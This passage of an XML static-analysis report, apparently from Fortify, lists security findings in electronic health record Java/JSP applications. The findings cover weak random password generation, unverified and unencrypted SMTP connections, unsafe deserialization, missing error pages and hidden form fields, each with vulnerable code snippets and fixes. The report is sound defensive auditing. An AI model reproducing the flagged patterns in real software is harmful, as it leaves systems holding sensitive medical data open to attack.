                        <Issue iid="60065CA1426ED2F2A8FBE40E50932CE0" ruleID="919BF191-6443-4239-BBFF-A7A31C108032">
                            <Category>Insecure Randomness</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Standard pseudorandom number generators cannot withstand cryptographic attacks.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>jquery.jqGrid.min.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/jquery.jqGrid.min.js</FilePath>
<LineStart>12183</LineStart>
<Snippet>									grid = opts.autoid.call(this,getdata);
								} else {
									grid = Math.ceil(Math.random()*1000);
									grid = opts.autoidprefix+grid;
								}</Snippet>
<TargetFunction>FunctionPointerCall()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="60065CA1426ED2F2A8FBE40E50932CE1" ruleID="919BF191-6443-4239-BBFF-A7A31C108032">
                            <Category>Insecure Randomness</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Standard pseudorandom number generators cannot withstand cryptographic attacks.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>grid.jqueryui.js</FileName>
<FilePath>EHR-WEBAPP/include/ehr/js/src/grid.jqueryui.js</FilePath>
<LineStart>424</LineStart>
<Snippet>									grid = opts.autoid.call(this,getdata);
								} else {
									grid = Math.ceil(Math.random()*1000);
									grid = opts.autoidprefix+grid;
								}</Snippet>
<TargetFunction>FunctionPointerCall()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D1F6765415714DD796E30C4CC4C97770" ruleID="49D75ADD-4BBD-49B9-AAF2-92B9BAB332FE">
                            <Category>Insecure Randomness</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The random number generator implemented by nextInt() cannot withstand a cryptographic attack.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>SecurityUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/security/common/SecurityUtil.java</FilePath>
<LineStart>694</LineStart>
<Snippet>            for (int j = 0; j &lt; nEntityContribution[i]; ++j) {
                b_sPwdValue.append(
                        b_sEntityValues[b_objRandomObj.nextInt(b_sEntityValues.length)]);
            }
</Snippet>
<TargetFunction>nextInt()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Insecure SSL: Server Identity Verification Disabled</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The connection established via send() in SendEmail.java does not verify the server certificate when making an SSL connection. This leaves the application vulnerable to a man-in-the-middle attack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>In some libraries that use SSL connections, the server certificate is not verified by default. This is equivalent to trusting all certificates.

Example 1: This application does not explicitly verify the server certificate.

  
  ...
  Email email = new SimpleEmail();
  email.setHostName("smtp.servermail.com");
  email.setSmtpPort(465);
  email.setAuthenticator(new DefaultAuthenticator(username, password));
  email.setSSLOnConnect(true);
  email.setFrom("user@gmail.com");
  email.setSubject("TestMail");
  email.setMsg("This is a test mail ... :-)");
  email.addTo("foo@bar.com");
  email.send();
  ...
  

When trying to connect to smtp.mailserver.com:465, this application would readily accept a certificate issued to "hackedserver.com". The application would now potentially leak sensitive user information on a broken SSL connection to the hacked server.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Do not forget server verification checks when making SSL connections. Depending on the library used, make sure to verify server identity and establish a secure SSL connection.

Example 2: This application does explicitly verify the server certificate.

  
  ...
  Email email = new SimpleEmail();
  email.setHostName("smtp.servermail.com");
  email.setSmtpPort(465);
  email.setAuthenticator(new DefaultAuthenticator(username, password));
  email.setSSLCheckServerIdentity(true);
  email.setSSLOnConnect(true);
  email.setFrom("user@gmail.com");
  email.setSubject("TestMail");
  email.setMsg("This is a test mail ... :-)");
  email.addTo("foo@bar.com");
  email.send();
  ...
  
  </Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="3157116D2148371A4C8B8C791CC28FF7" ruleID="AB805354-614C-4ACE-BEC1-60EAAF6340B0">
                            <Category>Insecure SSL: Server Identity Verification Disabled</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The connection established via send() in SendEmail.java does not verify the server certificate when making an SSL connection. This leaves the application vulnerable to a man-in-the-middle attack.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>98</LineStart>
<Snippet>				l_sFileName, EmailAttachment.ATTACHMENT);
		// send the email
		email.send();

	}</Snippet>
<TargetFunction>email.send() : Mail sent to unverified server()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0EDB71F494E9F8F7064D4A5A06A948A4" ruleID="AB805354-614C-4ACE-BEC1-60EAAF6340B0">
                            <Category>Insecure SSL: Server Identity Verification Disabled</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The connection established via send() in SendEmail.java does not verify the server certificate when making an SSL connection. This leaves the application vulnerable to a man-in-the-middle attack.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>55</LineStart>
<Snippet>		if (cc != null &amp;&amp; cc.length() &gt; 0)
			email.addCc(cc);
		email.send();
	}
</Snippet>
<TargetFunction>email.send() : Mail sent to unverified server()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2199E0F59E98FB5F028AAF1EC6B8CC5A" ruleID="AB805354-614C-4ACE-BEC1-60EAAF6340B0">
                            <Category>Insecure SSL: Server Identity Verification Disabled</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The connection established via send() in SendEmail.java does not verify the server certificate when making an SSL connection. This leaves the application vulnerable to a man-in-the-middle attack.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>71</LineStart>
<Snippet>		if (cc != null &amp;&amp; cc.length() &gt; 0)
			email.addCc(cc);
		email.send();
	}
</Snippet>
<TargetFunction>email.send() : Mail sent to unverified server()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Insecure Transport: Mail Transmission</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The method sendEmail() in SendEmail.java establishes an unencrypted connection to a mail server allowing an attacker to carry out a man-in-the-middle attack and read all the mail transmissions.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Sensitive data sent over the wire unencrypted is subject to be read/modified by any attacker that can intercept the network traffic.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Most of the modern mail service providers offer encrypted alternatives on different ports that use SSL/TLS to encrypt all the data being sent over the wire or to upgrade an existing unencrypted connection to SSL/TLS. Always use these alternatives when possible.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="2B2A5DB7A34CAA31D0C47FFA0C97F0CF" ruleID="23FD877B-B72B-497F-9D55-37BEEF9DDF1C">
                            <Category>Insecure Transport: Mail Transmission</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The method sendEmail() in SendEmail.java establishes an unencrypted connection to a mail server allowing an attacker to carry out a man-in-the-middle attack and read all the mail transmissions.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>55</LineStart>
<Snippet>		if (cc != null &amp;&amp; cc.length() &gt; 0)
			email.addCc(cc);
		email.send();
	}
</Snippet>
<TargetFunction>email.send() : Mail sent using unencrypted connection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0B49BE68DA9E6C0078342FABAD19E9BD" ruleID="23FD877B-B72B-497F-9D55-37BEEF9DDF1C">
                            <Category>Insecure Transport: Mail Transmission</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The method sendEmail() in SendEmail.java establishes an unencrypted connection to a mail server allowing an attacker to carry out a man-in-the-middle attack and read all the mail transmissions.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>98</LineStart>
<Snippet>				l_sFileName, EmailAttachment.ATTACHMENT);
		// send the email
		email.send();

	}</Snippet>
<TargetFunction>email.send() : Mail sent using unencrypted connection()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F631F1820B1218DBFC1BDC2C3301AFE3" ruleID="23FD877B-B72B-497F-9D55-37BEEF9DDF1C">
                            <Category>Insecure Transport: Mail Transmission</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>The method sendHTMLEmail() in SendEmail.java establishes an unencrypted connection to a mail server allowing an attacker to carry out a man-in-the-middle attack and read all the mail transmissions.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>SendEmail.java</FileName>
<FilePath>EHR-JAR/src/com/ehr/common/SendEmail.java</FilePath>
<LineStart>71</LineStart>
<Snippet>		if (cc != null &amp;&amp; cc.length() &gt; 0)
			email.addCc(cc);
		email.send();
	}
</Snippet>
<TargetFunction>email.send() : Mail sent using unencrypted connection()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>J2EE Misconfiguration: Missing Error Handling</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>A web application must define default error pages in order to prevent attackers from mining information from the application container's built-in error response.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>When an attacker explores a web site looking for vulnerabilities, the amount of information that the site provides is crucial to the eventual success or failure of any attempted attacks. If the application shows the attacker a stack trace, it relinquishes information that makes the attacker's job significantly easier. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.

The application configuration should specify a default error page in order to guarantee that the application will never leak error messages to an attacker. Handling standard HTTP error codes is useful and user-friendly in addition to being a good security practice, and a good configuration will also define a last-chance error handler that catches any exception that could possibly be thrown by the application.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>A web application must be configured with a default error page. Your web.xml should include at least the following entries:


&lt;error-page&gt;
   &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
&lt;error-page&gt;
   &lt;error-code&gt;404&lt;/error-code&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
&lt;error-page&gt;
   &lt;error-code&gt;500&lt;/error-code&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="399A248E35AE0FBB04255DE45FA9754C" ruleID="749BCC9F-FE61-4DC0-9EF2-5EF1872C7717">
                            <Category>J2EE Misconfiguration: Missing Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>A web application must define default error pages in order to prevent attackers from mining information from the application container's built-in error response.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>ECAMS-WEBAPP/WEB-INF/web.xml</FilePath>
<LineStart>3</LineStart>
<Snippet>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd"&gt;
&lt;web-app&gt;
    &lt;display-name&gt;eMIPP WebApp&lt;/display-name&gt;
    &lt;description&gt;The eMIPP web application&lt;/description&gt;</Snippet>
<TargetFunction>/web-app()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="399A248E35AE0FBB04255DE45FA9754D" ruleID="749BCC9F-FE61-4DC0-9EF2-5EF1872C7717">
                            <Category>J2EE Misconfiguration: Missing Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>A web application must define default error pages in order to prevent attackers from mining information from the application container's built-in error response.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>EHR-WEBAPP/WEB-INF/web.xml</FilePath>
<LineStart>5</LineStart>
<Snippet>        "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
        "http://java.sun.com/dtd/web-app_2_3.dtd"&gt;
&lt;web-app&gt;

    &lt;display-name&gt;ECAMS WebApp&lt;/display-name&gt;</Snippet>
<TargetFunction>/web-app()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="399A248E35AE0FBB04255DE45FA9754E" ruleID="749BCC9F-FE61-4DC0-9EF2-5EF1872C7717">
                            <Category>J2EE Misconfiguration: Missing Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>A web application must define default error pages in order to prevent attackers from mining information from the application container's built-in error response.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>XML/web.xml</FilePath>
<LineStart>5</LineStart>
<Snippet>&lt;web-app version="2.5"
 	xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 	xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"&gt;

    &lt;display-name&gt;EHR WebApp&lt;/display-name&gt;</Snippet>
<TargetFunction>/web-app()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Code Correctness: Multiple Stream Commits</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>On line 37 of dlgDownloadDocument.jsp, the method &lt;a href="location://EHR-WEBAPP/jsp/ehr/provider/registration/dlgDownloadDocument.jsp###37###0###0"&gt;getOutputStream()&lt;/a&gt; is called after the stream has already been committed or obtained.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Forwarding an HttpServletRequest, redirecting an HttpServletResponse, or flushing the servlet's output stream buffer causes the associated stream to commit. Any subsequent buffer resets or stream commits, such as additional flushes or redirects, will result in IllegalStateExceptions.

Furthermore, Java servlets allow data to be written to the response stream using either ServletOutputStream or PrintWriter, but not both. Calling getWriter() after having called getOutputStream(), or vice versa, will also cause an IllegalStateException.



At runtime, an IllegalStateException prevents the response handler from running to completion, effectively dropping the response. This can cause server instability, which is a sign of an improperly implemented servlet.

Example 1: The following code redirects the servlet response after its output stream buffer has been flushed.

public class RedirectServlet extends HttpServlet {
    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
        ...
        OutputStream out = res.getOutputStream();
        ...
        // flushes, and thereby commits, the output stream
        out.flush();
        out.close();        // redirecting the response causes an IllegalStateException
        res.sendRedirect("http://www.acme.com");
    }
}


Example 2: Conversely, the following code attempts to write to and flush the PrintWriter's buffer after the request has been forwarded.

public class FlushServlet extends HttpServlet {
    public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {
        ...
        // forwards the request, implicitly committing the stream
        getServletConfig().getServletContext().getRequestDispatcher("/jsp/boom.jsp").forward(req, res);
        ...

        // IllegalStateException; cannot redirect after forwarding
        res.sendRedirect("http://www.acme.com/jsp/boomboom.jsp");

        PrintWriter out = res.getWriter();

        // writing to an already-committed stream will not cause an exception,
        // but will not apply these changes to the final output, either
        out.print("Writing here does nothing");

        // IllegalStateException; cannot flush a response's buffer after forwarding the request
        out.flush();
        out.close();
    }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Ensure that no further changes to the stream are made after it is committed. At best, any further writes to the stream are ineffectual, and any additional commits
can cause the servlet to throw an IllegalStateException. It is generally good practice to observe these guidelines when possible:

1. Return immediately after a forward() or sendRedirect.
2. Avoid calling forward() or sendRedirect() after calling ServletResponse.getWriter() or ServletResponse.getOuputStream().</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="7ABA5D68FD55EE24B8E4A4AD32DC9821" ruleID="2920248A-E5CA-4446-B269-A541CD7FBCFA">
                            <Category>Code Correctness: Multiple Stream Commits</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>On line 37 of dlgDownloadDocument.jsp, the method &lt;a href="location://EHR-WEBAPP/jsp/ehr/provider/registration/dlgDownloadDocument.jsp###37###0###0"&gt;getOutputStream()&lt;/a&gt; is called after the stream has already been committed or obtained.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>dlgDownloadDocument.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/provider/registration/dlgDownloadDocument.jsp</FilePath>
<LineStart>37</LineStart>
<Snippet>			         	
			         	response.getOutputStream().flush();
			         	response.getOutputStream().close();
		        	}    
		}        </Snippet>
<TargetFunction>response.getOutputStream()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="68B0C83B9735EE98E11EED4617723EFF" ruleID="2920248A-E5CA-4446-B269-A541CD7FBCFA">
                            <Category>Code Correctness: Multiple Stream Commits</Category>
                            <Folder>Low</Folder>
                            <Kingdom>API Abuse</Kingdom>
                            <Abstract>On line 27 of dlgDownloadPDF.jsp, the method &lt;a href="location://EHR-WEBAPP/jsp/ehr/provider/registration/mu/dlgDownloadPDF.jsp###27###0###0"&gt;getOutputStream()&lt;/a&gt; is called after the stream has already been committed or obtained.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>dlgDownloadPDF.jsp</FileName>
<FilePath>EHR-WEBAPP/jsp/ehr/provider/registration/mu/dlgDownloadPDF.jsp</FilePath>
<LineStart>27</LineStart>
<Snippet>	         	
	         	response.getOutputStream().flush();
	         	response.getOutputStream().close();
        	}                     	
                      </Snippet>
<TargetFunction>response.getOutputStream()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Dynamic Code Evaluation: Unsafe Deserialization</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Deserializing user-controlled object streams at runtime can allow attackers to execute arbitrary code on the server, abuse application logic, and/or lead to denial of service.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Java serialization turns object graphs into byte streams that contain the objects themselves and the necessary metadata to reconstruct them from the byte stream. Developers can create custom code to aid in the process of deserializing Java objects, where they can replace the deserialized objects with different objects, or proxies. The customized deserialization process takes place during objects reconstruction, before the objects are returned to the application and cast into expected types. By the time developers try to enforce an expected type, code may have already been executed.

Custom deserialization routines are defined in the serializable classes which need to be present in the runtime classpath and cannot be injected by the attacker so the exploitability of these attacks depends on the classes available in the application environment. Unfortunately, common third party classes or even JDK classes can be abused to exhaust JVM resources, deploy malicious files, or run arbitrary code.




Example 1: An application deserializing untrusted object streams can lead to application compromise.

InputStream is = request.getInputStream();
ObjectInputStream ois = new ObjectInputStream(is);
MyObject obj = (MyObject) ois.readObject();
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>If possible, do not deserialize untrusted data without validating the contents of the object stream. In order to validate classes being deserialized, the look-ahead deserialization pattern should be used.

The object stream will first contain the class description metadata and then the serialized bytes of their member fields. The Java serialization process enables developers to read the class description and decide whether to proceed with the deserialization of the object or abort it. In order to do so, it is necessary to subclass java.io.ObjectInputStream and provide a custom implementation of the resolveClass(ObjectStreamClass desc) method where class validation and verification should take place.

There are existing implementations of the look-ahead pattern that can be easily used, such as the Apache Commons IO (org.apache.commons.io.serialization.ValidatingObjectInputStream). Always use a strict whitelist approach to only deserialize expected types. A blacklist approach is not recommended since attackers may use many available gadgets to bypass the blacklist. Also, keep in mind that although some classes to achieve code execution are publicly known, there may be others that are unknown or undisclosed, so a whitelist approach will always be preferred. Any class allowed in the whitelist should be audited to make sure it is safe to deserialize.

When deserialization takes place in a library or framework (for example, when using JMX, RMI, JMS, HTTP Invokers), the preceding recommendation is not useful since it is beyond the developer's control. In those cases, you may want to make sure that these protocols meet the following requirements:

- Not exposed publicly.
- Use authentication.
- Use integrity checks.
- Use encryption.

In addition, Fortify Runtime provides security controls to be enforced every time the application performs a deserialization from an ObjectInputStream, protecting both application code but also library and framework code from this type of attack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Tips</Name>
<Value>1. Due to existing flaw in ObjectInputStream implementation and the difficulties of blacklisting basic classes that may be used to perform Denial Of Service (DoS) attacks, this issue will be reported even if a look-ahead ObjectInputStream is implemented but its severity will be lowered to Medium.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="EF1F2464B4B7C9A8229612DA5F8BE7D1" ruleID="65F4371B-9180-4631-AC91-C06B07C5FC480">
                            <Category>Dynamic Code Evaluation: Unsafe Deserialization</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Deserializing user-controlled object streams at runtime can allow attackers to execute arbitrary code on the server, abuse application logic, and/or lead to denial of service.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SerializationHelper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/SerializationHelper.java</FilePath>
<LineStart>78</LineStart>
<Snippet>        ObjectInputStream l_objObjectInputStream = new ObjectInputStream (l_objByteArrayInputStream);

        Object l_objReturnObject = l_objObjectInputStream.readObject();

        l_objByteArrayInputStream.close();</Snippet>
<TargetFunction>java.io.ObjectInputStream.readObject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SerializationHelper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/SerializationHelper.java</FilePath>
<LineStart>124</LineStart>
<Snippet>
        File l_objFile = new File(p_sFileName);
        FileInputStream l_objFileInputStream = new FileInputStream(l_objFile);

        BufferedInputStream l_objBufferedInputStream = new BufferedInputStream(l_objFileInputStream);</Snippet>
<TargetFunction>java.io.FileInputStream.FileInputStream()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="01F424FA898D7297E90EE1EE838C6AAD" ruleID="65F4371B-9180-4631-AC91-C06B07C5FC480">
                            <Category>Dynamic Code Evaluation: Unsafe Deserialization</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Deserializing user-controlled object streams at runtime can allow attackers to execute arbitrary code on the server, abuse application logic, and/or lead to denial of service.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SerializationHelper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/SerializationHelper.java</FilePath>
<LineStart>78</LineStart>
<Snippet>        ObjectInputStream l_objObjectInputStream = new ObjectInputStream (l_objByteArrayInputStream);

        Object l_objReturnObject = l_objObjectInputStream.readObject();

        l_objByteArrayInputStream.close();</Snippet>
<TargetFunction>java.io.ObjectInputStream.readObject()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>SerializationHelper.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/database/SerializationHelper.java</FilePath>
<LineStart>131</LineStart>
<Snippet>
        byte [] l_objFileData = new byte [l_iFileSize];
        l_objBufferedInputStream.read(l_objFileData);
        l_objFileInputStream.close();
        l_objBufferedInputStream.close();</Snippet>
<TargetFunction>java.io.FilterInputStream.read()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="2">
                        <groupTitle>Hidden Field</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>A hidden form field is used in ehrONC.jsp at line 61.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Programmers often trust the contents of hidden fields, expecting that users will not be able to view them or manipulate their contents. Attackers will violate these assumptions. They will examine the values written to hidden fields and alter them or replace the contents with attack data.

Example: An &lt;input&gt; tag of type hidden indicates the use of a hidden field.

&lt;input type="hidden"&gt;


If hidden fields carry sensitive information, this information will be cached the same way the rest of the page is cached. This can lead to sensitive information being tucked away in the browser cache without the user's knowledge.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Expect that attackers will study and decode all uses of hidden fields in the application. Treat hidden fields as untrusted input. Don't store information in hidden fields if the information should not be cached along with the rest of the page.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>2</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="CBBF510F21C49312B9152A3F562F8028" ruleID="270C0EB3-09F5-4ABE-A8FF-B98604EB71DE">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>A hidden form field is used in ehrONC.jsp at line 61.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ehrONC.jsp</FileName>
<FilePath>ECAMS-WEBAPP/jsp/test/ehrONC.jsp</FilePath>
<LineStart>61</LineStart>
<Snippet>%&gt;
&lt;form ID="frmehrONC" NAME="activitiForm" METHOD="post" ACTION="ehrONC.jsp"&gt;
	&lt;Input TYPE="hidden" NAME="action" VALUE=""&gt;&lt;/Input&gt;
	&lt;br&gt;
	&lt;p&gt; This Admin screen is used to Turn on/off the ONC Webservice.&lt;/p&gt;</Snippet>
<TargetFunction>null()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1082211C78DE78F0D9A6652E26A047B1" ruleID="811489B8-AA5B-494C-9074-926A810A1421">
                            <Category>Hidden Field</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Encapsulation</Kingdom>
                            <Abstract>A hidden form field is used in pgErrorPage.jsp at line 150.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>pgErrorPage.jsp</FileName>
